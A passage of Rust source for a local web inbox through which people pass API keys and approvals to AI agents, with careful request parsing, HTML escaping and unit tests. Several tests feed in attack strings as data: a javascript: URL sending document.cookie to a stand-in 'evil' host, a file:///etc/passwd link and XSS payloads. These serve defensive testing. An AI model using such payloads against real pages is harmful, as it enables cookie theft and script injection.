/// main thread only ever sees whole requests. Returns the receiving end of that hand-off.
/// Readers for one listener, all handing complete requests to `req_tx`. `tailnet` marks the
/// requests from the Tailscale listener. A listener with `stop` can be closed: its acceptor
/// polls, checks the flag between accepts, and its readers end once the acceptor has. The
/// loopback listener has none and blocks in accept, so an idle inbox does not wake up.
fn spawn_readers(listener: TcpListener, tailnet: bool, req_tx: mpsc::SyncSender<Request>, stop: Option<Arc<std::sync::atomic::AtomicBool>>) {
    // A rendezvous: the acceptor hands a connection over only when a reader is free to take
    // it; until then new connections wait in the kernel's listen backlog. No queue of our
    // own, so nothing here grows with the number of clients.
    let (conn_tx, conn_rx) = mpsc::sync_channel::<TcpStream>(0);
    let conn_rx = Arc::new(Mutex::new(conn_rx));
    for _ in 0..READERS {
        let conn_rx = Arc::clone(&conn_rx);
        let req_tx = req_tx.clone();
        std::thread::spawn(move || loop {
            let next = conn_rx.lock().unwrap_or_else(|e| e.into_inner()).recv();
            let Ok(stream) = next else { return };
            if let Some(mut req) = read_request(stream, tailnet) {
                if tailnet {
                    req.peer_login = peer_login(&req);
                }
                if req_tx.send(req).is_err() {
                    return;
                }
            }
        });
    }
    // Non-blocking, so the flag is seen within a tick; a stopped acceptor drops the listener
    // (the port is free again) and the channel (its readers end).
    if stop.is_some() {
        let _ = listener.set_nonblocking(true);
    }
    std::thread::spawn(move || loop {
        if stop.as_ref().is_some_and(|s| s.load(std::sync::atomic::Ordering::Relaxed)) {
            return;
        }
        match listener.accept() {
            Ok((stream, _)) => {
                // Reads use timeouts, which need a blocking socket; some systems hand an
                // accepted socket the listener's non-blocking mode.
                let _ = stream.set_nonblocking(false);
                if conn_tx.send(stream).is_err() {
                    return;
                }
            }
            Err(e) if e.kind() == ErrorKind::Interrupted => {}
            Err(e) if e.kind() == ErrorKind::WouldBlock => std::thread::sleep(Duration::from_millis(25)),
            // Out of descriptors, or a connection that reset before we got to it: keep listening.
            Err(_) => std::thread::sleep(Duration::from_millis(50)),
        }
    });
}

/// Who sent a tailnet request from another device, as Tailscale names it. Asked here, on the
/// reader that read the request, and not by `handle`: `tailscale whois` can take seconds, and
/// the main thread answers everyone, loopback included. `None` for this machine, which is
/// not looked up because it gets what loopback gets, and for a device Tailscale cannot name.
fn peer_login(req: &Request) -> Option<String> {
    if from_this_machine(req) {
        return None;
    }
    crate::remote::whois(req.peer?.ip())
}

/// Listen on this machine's Tailscale address too, when remote access is on and nothing
/// listens there yet. Checked at start and once a second, so `tokenstash remote tailscale`
/// takes effect in a running inbox, including after the address changed. Turning it off needs
/// no unbinding: every tailnet request is checked against the setting as it is then, so an
/// old address's listener answers nothing.
/// The Tailscale listener in use: its address, and the flag that stops it.
type Tailnet = Option<(std::net::IpAddr, Arc<std::sync::atomic::AtomicBool>)>;

fn listen_tailnet(port: u16, bound: &mut Tailnet, req_tx: &mpsc::SyncSender<Request>) {
    let Ok(cfg) = tokenstash_core::Config::load() else { return };
    let want = if cfg.remote == tokenstash_core::config::Remote::Tailscale { cfg.remote_ip.as_deref().and_then(|i| i.parse::<std::net::IpAddr>().ok()) } else { None };
    if bound.as_ref().map(|(ip, _)| *ip) == want {
        return;
    }
    // Turned off, or the address changed: close the old listener first, so its port is free
    // and none of its threads outlive it.
    if let Some((_, stop)) = bound.take() {
        stop.store(true, std::sync::atomic::Ordering::Relaxed);
    }
    let Some(ip) = want else { return };
    match TcpListener::bind((ip, port)) {
        Ok(l) => {
            eprintln!("tokenstash inbox → {}/ (Tailscale)", crate::remote::base_url(&cfg));
            let stop = Arc::new(std::sync::atomic::AtomicBool::new(false));
            spawn_readers(l, true, req_tx.clone(), Some(Arc::clone(&stop)));
            *bound = Some((ip, stop));
        }
        Err(e) => eprintln!("inbox: cannot listen on {ip}:{port}: {e}"),
    }
}

/// Why a request did not arrive.
enum Incomplete {
    /// The client hung up, or the socket failed.
    Eof,
    /// A wait ran past [`IO_TIMEOUT`], or the whole request past [`REQUEST_DEADLINE`].
    Timeout,
}

/// Reads one complete request, or says why there will not be one and closes the socket.
///
/// Every wait for bytes is bounded by [`IO_TIMEOUT`] (the socket's read timeout) and checked
/// against the whole-request deadline before the next, so a client that drips one byte per
/// wait is cut off within `REQUEST_DEADLINE + IO_TIMEOUT`, like one that goes silent.
fn read_request(mut stream: TcpStream, tailnet: bool) -> Option<Request> {
    let peer = stream.peer_addr().ok();
    // A socket that cannot take a timeout is not one to read from.
    if stream.set_read_timeout(Some(IO_TIMEOUT)).is_err() || stream.set_write_timeout(Some(IO_TIMEOUT)).is_err() {
        return None;
    }
    let deadline = Instant::now() + REQUEST_DEADLINE;
    let mut buf: Vec<u8> = Vec::new();
    let head_end = loop {
        if let Some(i) = buf.windows(4).position(|w| w == b"\r\n\r\n") {
            break i;
        }
        if buf.len() >= MAX_HEAD {
            return reject(stream, 431);
        }
        let room = MAX_HEAD - buf.len();
        match read_some(&mut stream, &mut buf, room, deadline) {
            Ok(()) => {}
            // A client that hung up mid-request (a browser's speculative preconnect does this
            // routinely) is not owed an answer.
            Err(Incomplete::Eof) => return None,
            Err(Incomplete::Timeout) => return reject(stream, 408),
        }
    };
    let head = match parse_head(&buf[..head_end]) {
        Ok(h) => h,
        Err(code) => return reject(stream, code),
    };
    let mut body = buf.split_off(head_end + 4);
    let oversized = head.content_length > MAX_BODY;
    if oversized {
        // Refused on the declaration alone: not a byte of it is read, so it can neither hold
        // this reader nor be stored in part.
        body.clear();
    } else {
        let want = head.content_length as usize;
        body.truncate(want);
        if body.len() < want && head.expects_continue {
            let _ = write_bounded(&mut stream, b"HTTP/1.1 100 Continue\r\n\r\n", deadline);
        }
        while body.len() < want {
            let missing = want - body.len();
            match read_some(&mut stream, &mut body, missing, deadline) {
                Ok(()) => {}
                Err(Incomplete::Eof) => return None,
                Err(Incomplete::Timeout) => return reject(stream, 408),
            }
        }
    }
    Some(Request { method: head.method, url: head.url, headers: head.headers, body, oversized, stream: Some(stream), peer, tailnet, peer_login: None, set_cookie: None })
}

/// One read of up to `max` bytes appended to `buf`, or why there was none. Returns within
/// [`IO_TIMEOUT`] of being called, and refuses to start once `deadline` has passed.
fn read_some(stream: &mut TcpStream, buf: &mut Vec<u8>, max: usize, deadline: Instant) -> std::result::Result<(), Incomplete> {
    let mut chunk = [0u8; 4096];
    let take = max.min(chunk.len());
    loop {
        if Instant::now() >= deadline {
            return Err(Incomplete::Timeout);
        }
        match stream.read(&mut chunk[..take]) {
            Ok(0) => return Err(Incomplete::Eof),
            Ok(n) => {
                buf.extend_from_slice(&chunk[..n]);
                return Ok(());
            }
            Err(e) if e.kind() == ErrorKind::Interrupted => {}
            Err(e) if matches!(e.kind(), ErrorKind::WouldBlock | ErrorKind::TimedOut) => return Err(Incomplete::Timeout),
            Err(_) => return Err(Incomplete::Eof),
        }
    }
}

/// A bare status and the socket closed. Says nothing about what is listening here. Written
/// under its own short deadline: the request's may already have passed, and a client that will
/// not take even this gets nothing more of the reader's time.
fn reject(mut stream: TcpStream, code: u16) -> Option<Request> {
    let _ = write_reply(&mut stream, &Reply::new(code, String::new()), false, Instant::now() + IO_TIMEOUT);
    let _ = stream.shutdown(Shutdown::Both);
    None
}

struct Head {
    method: String,
    url: String,
    headers: Vec<(String, String)>,
    content_length: u64,
    expects_continue: bool,
}

/// The request line and headers (without the blank line), or the status to refuse them with.
/// Strict on purpose: what is not exactly HTTP/1.x from a browser or the CLI is a bad request;
/// nothing that could be echoed into a response header (a redirect is built from the path)
/// may carry a control character or name another host; and a header whose meaning we act on
/// (`Host`, `Expect`, `Content-Length`) may not be ambiguous.
fn parse_head(raw: &[u8]) -> std::result::Result<Head, u16> {
    let text = std::str::from_utf8(raw).map_err(|_| 400u16)?;
    let mut lines = text.split("\r\n");
    let line = lines.next().ok_or(400u16)?;
    if line.bytes().any(|b| b < 0x20 || b == 0x7f) {
        return Err(400);
    }
    let mut parts = line.split(' ');
    let (method, url, version) = (parts.next().unwrap_or_default(), parts.next().unwrap_or_default(), parts.next().unwrap_or_default());
    if parts.next().is_some() || method.is_empty() || !method.bytes().all(|b| b.is_ascii_alphanumeric()) {
        return Err(400);
    }
    if !same_origin_path(url) || !matches!(version, "HTTP/1.1" | "HTTP/1.0") {
        return Err(400);
    }
    let mut headers = Vec::new();
    for l in lines {
        if headers.len() >= MAX_HEADERS {
            return Err(431);
        }
        if l.bytes().any(|b| (b < 0x20 && b != b'\t') || b == 0x7f) {
            return Err(400);
        }
        let (name, value) = l.split_once(':').ok_or(400u16)?;
        // A name with whitespace in it, or none at all (obsolete line folding), is not a header.
        if name.is_empty() || !name.bytes().all(|b| b.is_ascii_graphic()) {
            return Err(400);
        }
        headers.push((name.to_string(), value.trim().to_string()));
    }
    for single in ["Host", "Expect"] {
        if headers.iter().filter(|(n, _)| n.eq_ignore_ascii_case(single)).count() > 1 {
            return Err(400);
        }
    }
    let mut content_length: Option<u64> = None;
    for (name, value) in &headers {
        // Browsers and the CLI never chunk a request to us, and a body of unknown length has
        // no place under a declared-length cap.
        if name.eq_ignore_ascii_case("Transfer-Encoding") {
            return Err(411);
        }
        if name.eq_ignore_ascii_case("Content-Length") {
            // Digits only, and two declarations must agree.
            if value.is_empty() || !value.bytes().all(|b| b.is_ascii_digit()) {
                return Err(400);
            }
            let n: u64 = value.parse().map_err(|_| 400u16)?;
            if content_length.is_some_and(|seen| seen != n) {
                return Err(400);
            }
            content_length = Some(n);
        }
    }
    let expects_continue = match headers.iter().find(|(n, _)| n.eq_ignore_ascii_case("Expect")) {
        None => false,
        Some((_, v)) if v.eq_ignore_ascii_case("100-continue") => true,
        Some(_) => return Err(417),
    };
    Ok(Head { method: method.to_string(), url: url.to_string(), headers, content_length: content_length.unwrap_or(0), expects_continue })
}

fn parse_form(s: &str) -> HashMap<String, String> {
    s.split('&')
        .filter_map(|kv| {
            let (k, v) = kv.split_once('=')?;
            Some((form_decode(k), form_decode(v)))
        })
        .collect()
}

/// One form-urlencoded token: `+` is a space, then percent-decoding.
fn form_decode(x: &str) -> String {
    urlencoding::decode(&x.replace('+', " ")).map(|c| c.into_owned()).unwrap_or_default()
}

fn esc(s: &str) -> String {
    s.replace('&', "&amp;").replace('<', "&lt;").replace('>', "&gt;").replace('"', "&quot;").replace('\'', "&#39;")
}

const CSS: &str = r#"
:root{color-scheme:light dark;--fg:#111;--bg:#fff;--mut:#666;--line:#e5e5e5;--acc:#2563eb;--ok:#16a34a;--bad:#dc2626}
@media(prefers-color-scheme:dark){:root{--fg:#eee;--bg:#111;--mut:#999;--line:#2a2a2a}}
*{box-sizing:border-box}body{margin:0;font:15px/1.5 system-ui,-apple-system,sans-serif;color:var(--fg);background:var(--bg)}
main{max-width:640px;margin:0 auto;padding:32px 20px}h1{font-size:18px;margin:0 0 20px}h2{font-size:20px;margin:0 0 6px}
.card{border:1px solid var(--line);border-radius:10px;padding:18px;margin:0 0 14px}.mut{color:var(--mut);font-size:13px}
a.btn,button{display:inline-block;padding:9px 14px;border-radius:8px;border:1px solid var(--line);background:transparent;color:var(--fg);font:inherit;cursor:pointer;text-decoration:none}
button.p,a.btn.p{background:var(--acc);border-color:var(--acc);color:#fff}button.bad{border-color:var(--bad);color:var(--bad)}
input[type=password],input[type=text],textarea{width:100%;padding:10px;border:1px solid var(--line);border-radius:8px;background:transparent;color:var(--fg);font:inherit}
ol{padding-left:20px}.row{display:flex;gap:10px;align-items:center;flex-wrap:wrap;margin-top:12px}.flash{background:color-mix(in srgb,var(--ok) 12%,transparent);border:1px solid var(--ok);padding:10px 14px;border-radius:8px;margin-bottom:16px}
.err{background:color-mix(in srgb,var(--bad) 12%,transparent);border:1px solid var(--bad);padding:10px 14px;border-radius:8px;margin-bottom:16px}code{font-size:13px}
"#;

fn layout(title: &str, body: String) -> String {
    format!("<!doctype html><html><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=referrer content=no-referrer><title>{} · tokenstash</title><style>{CSS}</style></head><body><main><h1>tokenstash inbox</h1>{body}</main></body></html>", esc(title))
}

fn page_index(list: &[Task], flash: Option<&str>) -> String {
    let mut b = String::new();
    if let Some(f) = flash {
        b.push_str(&format!("<div class=flash>✓ {}</div>", esc(f)));
    }
    if list.is_empty() {
        b.push_str("<p class=mut>No open tasks. Your agents have everything they need.</p>");
    }
    for t in list {
        let what = match t.kind {
            TaskKind::Secret => format!("<code>{}</code>", esc(&t.name.clone().unwrap_or_default())),
            TaskKind::Approval => format!("approve {}", esc(&crate::util::approval_names(&t.names).join(", "))),
            TaskKind::Human => esc(&t.title),
        };
        b.push_str(&format!(
            "<div class=card><div class=mut>{} · {}</div><h2>{}</h2><div class=mut>{}</div><div class=row><a class='btn p' href='/t/{}'>Open →</a></div></div>",
            esc(&tokenstash_core::project::short(std::path::Path::new(&t.project))), esc(&t.agent), what, esc(&t.title), t.id
        ));
    }
    layout("Inbox", b)
}

/// The second half of the double submit. A hidden field rather than a header because these
/// are plain HTML forms with no JavaScript.
fn csrf_field(token: &str) -> String {
    format!("<input type=hidden name=t value=\"{}\">", esc(token))
}

/// `needs_full`: deciding on this card takes the person's own session (an approval, a paste
/// other directories receive, an action an agent asked for), so the scoped page offers to send
/// it to their desktop.
fn page_task(t: &Task, err: Option<&str>, flash: Option<&str>, token: &str, scope: &inbox_auth::Scope, env_file: &str, needs_full: bool) -> String {
    let csrf = csrf_field(token);
    let mut b = String::new();
    let scoped = *scope != inbox_auth::Scope::Full;
    // A scoped page is one card and nothing around it: no index to go back to.
    if scoped {
        b.push_str("<p class=mut>This link opens this one card. Every waiting card is in the inbox you open from a tokenstash desktop notification.</p>");
    } else {
        b.push_str("<p><a href='/'>← all tasks</a></p>");
    }
    if let Some(f) = flash {
        b.push_str(&format!("<div class=flash>✓ {}</div>", esc(f)));
    }
    if let Some(e) = err {
        b.push_str(&format!("<div class=err>{}</div>", esc(e)));
    }
    b.push_str(&format!("<div class=card><div class=mut>{} · requested by {}</div><h2>{}</h2>", esc(&tokenstash_core::project::short(std::path::Path::new(&t.project))), esc(&t.agent), esc(&t.title)));
    if let Some(w) = &t.why { b.push_str(&format!("<p>{}</p>", esc(w))); }
    // Second gate on the scheme (tasks::clean_url is the first): this is the one place a
    // card's text becomes something the human clicks, so it does not inherit trust from the
    // layer that stored it. A link that is not http(s) is simply not rendered as a link.
    if let Some(u) = t.url.as_deref().filter(|u| { let l = u.to_ascii_lowercase(); l.starts_with("https://") || l.starts_with("http://") }) {
        // The label is the host alone: `https://openai.com@evil.example/` must read as
        // evil.example, not as openai.com.
        let host = u.split_once("//").map(|(_, r)| r).unwrap_or(u).split('/').next().unwrap_or(u);
        let host = host.rsplit('@').next().unwrap_or(host);
        b.push_str(&format!("<div class=row><a class='btn p' href='{0}' target=_blank rel='noopener noreferrer'>Open {1} ↗</a></div>", esc(u), esc(host)));
    }
    if !t.steps.is_empty() {
        b.push_str("<ol>");
        for s in &t.steps { b.push_str(&format!("<li>{}</li>", esc(s))); }
        b.push_str("</ol>");
    }
    if t.status != TaskStatus::Pending {
        b.push_str(&format!("<p class=mut>This task is {}.</p></div>", t.status.as_str()));
        return layout(&t.title, b);
    }
    // The way from the agent's link to a decision, without a terminal: the person's own link
    // arrives as a desktop notification on the machine running this inbox.
    let resend = if scoped && needs_full {
        format!("<form method=post>{csrf}<div class=row><button class=p name=action value=notify>Send the link to my desktop</button></div></form><p class=mut>Deciding on this card takes your own inbox link, which tokenstash sends only to this computer's desktop, so the agent that asked can never answer it. If no notification appears, this computer has no desktop session; open the inbox on it directly.</p>")
    } else {
        String::new()
    };
    match t.kind {
        TaskKind::Secret => {
            b.push_str(&resend);
            b.push_str(&format!(
                "<form method=post autocomplete=off>{csrf}<label class=mut for=v>{}</label><input id=v type=password name=value autocomplete=off autofocus placeholder='paste here — never shown to the agent'>{}<div class=mut style='margin-top:8px'>What happens to it: {} then it is stored in your keychain and written to <code>{}</code> in the requesting directory{}. The agent reads that file; it never sees the value in chat.</div><label class=mut style='display:block;margin-top:8px'><input type=checkbox name=skip_check value=1> skip the provider check (store even if it cannot be verified)</label><div class=row><button class=p type=submit>Store &amp; inject</button><button class=bad name=action value=deny formnovalidate>Decline</button></div></form>",
                esc(&t.name.clone().unwrap_or_default()),
                t.pattern.as_ref().map(|p| format!("<div class=mut>must match <code>{}</code></div>", esc(p))).unwrap_or_default(),
                if tokenstash_core::registry::lookup(t.name.as_deref().unwrap_or_default()).and_then(|p| p.check.as_ref()).is_some() { "one authenticated request goes to the provider to confirm the key works (unless you skip the check)," } else { "no provider check exists for this name, so it is stored as pasted;" },
                esc(env_file),
                if t.expects == tasks::EXPECTS_REPLACE { ", and into every other directory you granted this key" } else { "" }
            ));
        }
        TaskKind::Approval => {
            // The human is approving a delivery, so the card must show everything that
            // decision covers: the canonical path, what kind of decision this is, the
            // exact destination file, and every key with its identity and sensitivity.
            let kind = match t.expects.as_str() { tasks::APPROVAL_PAIRING => "new directory — first stored keys", tasks::APPROVAL_SENSITIVE => "sensitive / unregistered keys — each its own decision", tasks::APPROVAL_ONCE => "chosen by a running program — this run only", _ => "approval" };
            b.push_str(&format!("<p class=mut>Directory: <code>{}</code><br>Decision: {}<br>Written to: <code>{}</code></p>", esc(&t.project), esc(kind), esc(&std::path::Path::new(&t.project).join(env_file).display().to_string())));
            let rows: Vec<String> = t.names.iter().filter(|n| n.as_str() != "*").map(|entry| {
                let (n, identity) = tasks::split_identity(entry);
                let sensitive = tokenstash_core::registry::lookup(n).map(|p| p.sensitive).unwrap_or(false) || tokenstash_core::registry::lookup(n).is_none();
                format!("<li><code>{}</code>{}{}</li>", esc(n), if identity != "default" { format!(" <span class=mut>@{}</span>", esc(identity)) } else { String::new() }, if sensitive { " <span class=err>sensitive</span>" } else { "" })
            }).collect();
            b.push_str(&format!("<ul>{}</ul>", rows.join("")));
            if *scope == inbox_auth::Scope::Full {
                let broad = if t.expects == tasks::APPROVAL_PAIRING {
                    "<button name=action value=allow_broad title='also any registry-confirmed non-sensitive key for this identity, in this directory only'>Allow these + any non-sensitive key here</button>"
                } else { "" };
                let seen = esc(&t.names.join(","));
                b.push_str(&format!("<form method=post>{csrf}<input type=hidden name=seen value='{seen}'><div class=row><button class=p name=action value=allow>Allow these</button>{broad}<button class=bad name=action value=deny>Deny</button></div></form>"));
            } else {
                b.push_str("<div class=err>Approving takes your own inbox link. The link your agent gave you can paste keys but not approve, so an agent can never approve its own request.</div>");
                b.push_str(&resend);
            }
        }
        TaskKind::Human if tokenstash_core::actions::Action::of(t).is_some() => {
            let act = tokenstash_core::actions::Action::of(t).expect("checked above");
            b.push_str(&format!("<p><strong>If you confirm:</strong> {}</p>", esc(&act.effect())));
            if !act.machine_wide() {
                b.push_str(&format!("<p class=mut>Project: <code>{}</code></p>", esc(&t.project)));
            }
            if scoped {
                b.push_str("<div class=err>Confirming takes your own inbox link, so the agent that asked can never confirm its own request.</div>");
                b.push_str(&resend);
                b.push_str(&format!("<form method=post>{csrf}<div class=row><button class=bad name=action value=deny>Decline</button></div></form>"));
            } else {
                b.push_str(&format!("<form method=post>{csrf}<div class=row><button class=p name=action value=done>Confirm</button><button class=bad name=action value=deny>Decline</button></div></form>"));
            }
        }
        TaskKind::Human => {
            // Said before the field, not after: both the answer and the reason for declining
            // go back to the agent word for word, and the agent's context is not a place for
            // anything private.
            b.push_str("<div class=err>Whatever you type below is returned to the agent word for word — as your answer if you press Done, as the reason if you press Can't do this. Do not put a password, a key, or anything private in it; the agent should request secrets with <code>tokenstash need</code>.</div>");
            let note = if t.expects == "text" {
                "<textarea name=note rows=3 placeholder='your answer (sent to the agent)'></textarea>"
            } else {
                "<input type=text name=note placeholder='optional note (sent to the agent)'>"
            };
            b.push_str(&format!("<form method=post>{csrf}{note}<div class=row><button class=p name=action value=done>Done</button><button class=bad name=action value=deny>Can't do this</button></div></form>"));
        }
    }
    b.push_str("</div>");
    layout(&t.title, b)
}

#[cfg(test)]
mod tests {
    use super::*;

    /// The link the card's "send it to my desktop" button sends is on loopback, even with
    /// remote access on and a listener on the Tailscale address that passes the proof. The
    /// notification shows on this computer, and the inbox proving its own tailnet listener
    /// from the thread that has to answer the proof would only wait out the probe.
    #[test]
    fn the_desktop_link_stays_on_loopback() {
        use tokenstash_core::config::Remote;
        let _g = inbox_auth::env_lock();
        let home = std::env::temp_dir().join(format!("tokenstash-desktop-link-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&home);
        std::fs::create_dir_all(&home).unwrap();
        std::env::set_var("TOKENSTASH_HOME", &home);
        let port = crate::notify::fake_inbox(Arc::new(std::sync::atomic::AtomicBool::new(true)));
        let cfg = tokenstash_core::Config { inbox_port: port, remote: Remote::Tailscale, remote_ip: Some("127.0.0.1".into()), remote_host: Some("box.tail1234.ts.net".into()), ..Default::default() };
        let link = desktop_link(&cfg, "t_abc");
        let tailnet = crate::util::inbox_url(&cfg, Some("t_abc"));
        std::env::remove_var("TOKENSTASH_HOME");
        let _ = std::fs::remove_dir_all(&home);
        assert!(link.starts_with(&format!("http://127.0.0.1:{port}/t/t_abc")), "{link}");
        assert!(tailnet.starts_with("http://box.tail1234.ts.net:"), "the listener passes the proof: {tailnet}");
    }

    #[test]
    fn csrf_field_carries_the_token_and_escapes_it() {
        assert_eq!(csrf_field("abc123"), "<input type=hidden name=t value=\"abc123\">");
        // The token is hex so this cannot happen, but the field must never be an injection point.
        assert_eq!(csrf_field("\"><script>"), "<input type=hidden name=t value=\"&quot;&gt;&lt;script&gt;\">");
    }

    fn card(url: Option<&str>, why: &str) -> Task {
        Task {
            id: "t_abc123".into(), kind: TaskKind::Secret, project: "/tmp/p".into(), agent: "agent".into(),
            name: Some("OPENAI_API_KEY".into()), identity: "default".into(), title: "OpenAI API key".into(),
            why: Some(why.into()), url: url.map(String::from), steps: vec![],
            expects: "secret".into(), pattern: None, names: vec![], status: TaskStatus::Pending,
            created: "2026-01-01T00:00:00Z".into(), deadline: "2099-01-01T00:00:00Z".into(),
            answered_at: None, note: None,
        }
    }

    /// The card's link is the one thing on the page the human clicks. A `javascript:` URL
    /// there would run in the inbox's own origin — the origin whose session approves grants.
    #[test]
    fn a_card_link_is_rendered_only_for_http_schemes() {
        for bad in ["javascript:fetch('//evil/'+document.cookie)", "data:text/html,<script>x</script>", "file:///etc/passwd", "JavaScript:alert(1)"] {
            let page = page_task(&card(Some(bad), "why"), None, None, "tok", &inbox_auth::Scope::Full, ".env.local", false);
            assert!(!page.contains("href='javascript"), "{bad}: {page}");
            assert!(!page.to_lowercase().contains("javascript:"), "{bad}");
            assert!(!page.contains("data:text/html"), "{bad}");
            assert!(!page.contains("Open "), "no link button at all for {bad}");
        }
        let page = page_task(&card(Some("https://platform.openai.com/api-keys"), "why"), None, None, "tok", &inbox_auth::Scope::Full, ".env.local", false);
        assert!(page.contains("href='https://platform.openai.com/api-keys'"), "{page}");
        assert!(page.contains("Open platform.openai.com"), "the host is what the human reads: {page}");
    }

    /// Agent-written text is escaped wherever it lands on the page.
    #[test]
    fn agent_written_card_text_cannot_become_markup() {
        let page = page_task(&card(None, "<img src=x onerror=alert(1)>\"'"), None, None, "tok", &inbox_auth::Scope::Full, ".env.local", false);
        assert!(!page.contains("<img src=x"), "{page}");
        assert!(page.contains("&lt;img src=x onerror=alert(1)&gt;"), "{page}");
    }

    /// `/t/<id>` names one id, exactly; what to do with it is the scope's business.
    #[test]
    fn a_task_path_yields_its_id_and_nothing_else() {
        assert_eq!(path_task_id("/t/t_abc123", "/t/"), Some("t_abc123"));
        assert_eq!(path_task_id("/t/t_abc123/", "/t/"), Some("t_abc123"));
        assert_eq!(path_task_id("/t/", "/t/"), None);
        assert_eq!(path_task_id("/", "/t/"), None);
        assert_eq!(path_task_id("/tasks/t_abc123", "/t/"), None);
        assert_eq!(path_task_id("/p/t_abc123/x", "/p/"), None, "nothing below a card");
        assert_eq!(Route::of("/"), Some(Route::Index));
        assert_eq!(Route::of("/t/t_abc"), Some(Route::Full("t_abc".into())));
        assert_eq!(Route::of("/p/t_abc"), Some(Route::Scoped("t_abc".into())));
        assert_eq!(Route::of("/x"), None);
    }

    /// The session opens the full routes and nothing scoped; a capability opens its own
    /// card's scoped route and nothing else — not the full route for the same card, not a
    /// sibling's scoped route.
    #[test]
    fn each_route_admits_exactly_its_own_kind_of_credential() {
        use inbox_auth::Scope;
        let full = Scope::Full;
        let a = Scope::Task("t_aaa".into());
        assert!(Route::Index.admits(&full) && Route::Full("t_aaa".into()).admits(&full));
        assert!(!Route::Scoped("t_aaa".into()).admits(&full), "a full session is not consulted on a scoped route");
        assert!(Route::Scoped("t_aaa".into()).admits(&a));
        assert!(!Route::Scoped("t_bbb".into()).admits(&a), "a sibling's route");
        assert!(!Route::Scoped("t_aa".into()).admits(&a) && !Route::Scoped("t_aaaa".into()).admits(&a), "prefix or extension of the id");
        assert!(!Route::Full("t_aaa".into()).admits(&a) && !Route::Index.admits(&a), "a capability never opens a full route");
        assert_eq!(Route::Scoped("t_aaa".into()).cookie_name(), inbox_auth::CAP_COOKIE);
        assert_eq!(Route::Index.cookie_name(), inbox_auth::COOKIE);
    }

    /// The secret card says where the value goes, and the human card says, before the field,
    /// that both the answer and the decline reason are returned to the agent.
    #[test]
    fn the_cards_say_what_happens_to_what_is_typed() {
        let page = page_task(&card(None, "why"), None, None, "tok", &inbox_auth::Scope::Task("t_abc123".into()), ".env.local", false);
        assert!(page.contains("one authenticated request goes to the provider"), "OPENAI_API_KEY has a registry check: {page}");
        assert!(page.contains("written to <code>.env.local</code>"), "{page}");
        assert!(!page.contains("never sent anywhere"), "the old absolute claim is gone: {page}");
        let mut replace = card(None, "why");
        replace.expects = tasks::EXPECTS_REPLACE.into();
        assert!(page_task(&replace, None, None, "tok", &inbox_auth::Scope::Full, ".env.local", false).contains("every other directory you granted this key"));
        let mut human = card(None, "why");
        human.kind = TaskKind::Human;
        human.expects = "confirm".into();
        let page = page_task(&human, None, None, "tok", &inbox_auth::Scope::Full, ".env.local", false);
        let warn = page.find("returned to the agent word for word").expect("the warning is on the page");
        let field = page.find("name=note").expect("the note field is on the page");
        assert!(warn < field, "the warning comes before the field: {page}");
        assert!(page.contains("as the reason if you press Can't do this"), "{page}");
    }

    /// An action card an agent filed: the full session confirms it; the agent's own link shows
    /// what confirming does, can decline, and offers to send the person their link instead of
    /// a Confirm button.
    #[test]
    fn an_action_card_is_confirmed_only_with_the_persons_own_link() {
        let mut t = card(None, "the user asked to clean up old keys");
        t.kind = TaskKind::Human;
        t.expects = "action:forget".into();
        t.names = vec!["OPENAI_API_KEY@default".into()];
        t.title = "Forget OPENAI_API_KEY".into();
        let full = page_task(&t, None, None, "tok", &inbox_auth::Scope::Full, ".env.local", true);
        assert!(full.contains("If you confirm:") && full.contains("is deleted from your stash") && full.contains("value=done>Confirm"), "{full}");
        assert!(!full.contains("value=notify"), "the person's own page needs no link sent: {full}");
        let scoped = page_task(&t, None, None, "tok", &inbox_auth::Scope::Task("t_abc123".into()), ".env.local", true);
        assert!(scoped.contains("value=notify") && scoped.contains("value=deny") && !scoped.contains("value=done"), "{scoped}");
        assert!(!scoped.contains("tokenstash open"), "no terminal step on the agent's link: {scoped}");
    }

    /// An approval opened from the agent's link cannot be approved there; the page sends the
    /// person their own link instead of telling them to open a terminal.
    #[test]
    fn a_scoped_approval_offers_to_send_the_link() {
        let mut t = card(None, "why");
        t.kind = TaskKind::Approval;
        t.expects = tasks::APPROVAL_PAIRING.into();
        t.names = vec!["OPENAI_API_KEY@default".into()];
        let scoped = page_task(&t, None, None, "tok", &inbox_auth::Scope::Task("t_abc123".into()), ".env.local", true);
        assert!(scoped.contains("value=notify") && !scoped.contains("value=allow") && !scoped.contains("tokenstash open"), "{scoped}");
        let full = page_task(&t, None, None, "tok", &inbox_auth::Scope::Full, ".env.local", true);
        assert!(full.contains("value=allow") && !full.contains("value=notify"), "{full}");
    }

    #[test]
    fn parse_form_reads_the_csrf_field_out_of_a_body() {
        let f = parse_form("value=sk-abc&t=deadbeef&skip_check=1");
        assert_eq!(f.get("t").map(String::as_str), Some("deadbeef"));
        assert_eq!(f.get("value").map(String::as_str), Some("sk-abc"));
        // A body with no token at all authenticates nothing.
        assert!(!parse_form("value=sk-abc").contains_key("t"));
    }

    fn head(s: &str) -> std::result::Result<Head, u16> {
        parse_head(s.as_bytes())
    }

    #[test]
    fn a_browser_form_post_head_parses() {
        let h = head("POST /t/abc?x=1 HTTP/1.1\r\nHost: 127.0.0.1:7433\r\ncookie: tokenstash_inbox=deadbeef\r\nContent-Length:  12 \r\nExpect: 100-continue").unwrap();
        assert_eq!(h.method, "POST");
        assert_eq!(h.url, "/t/abc?x=1");
        assert_eq!(h.content_length, 12);
        assert!(h.expects_continue);
        assert_eq!(h.headers.iter().find(|(n, _)| n.eq_ignore_ascii_case("Cookie")).map(|(_, v)| v.as_str()), Some("tokenstash_inbox=deadbeef"));
        let h = head("GET / HTTP/1.0").unwrap();
        assert_eq!(h.content_length, 0);
        assert!(h.headers.is_empty() && !h.expects_continue);
        // Two agreeing declarations are one declaration.
        assert_eq!(head("POST / HTTP/1.1\r\nContent-Length: 7\r\ncontent-length: 7").unwrap().content_length, 7);
    }

    #[test]
    fn malformed_heads_are_refused_with_a_status_not_parsed_loosely() {
        for (raw, code) in [
            ("GET / HTTP/2.0", 400), ("GET /", 400), ("GET  / HTTP/1.1", 400), ("GET / HTTP/1.1 extra", 400), ("GET nope HTTP/1.1", 400), ("", 400),
            // A bare LF or another control character in the target must never reach a Location header.
            ("GET /a\nb HTTP/1.1", 400), ("GET /\x01 HTTP/1.1", 400), ("GET /\x7f HTTP/1.1", 400),
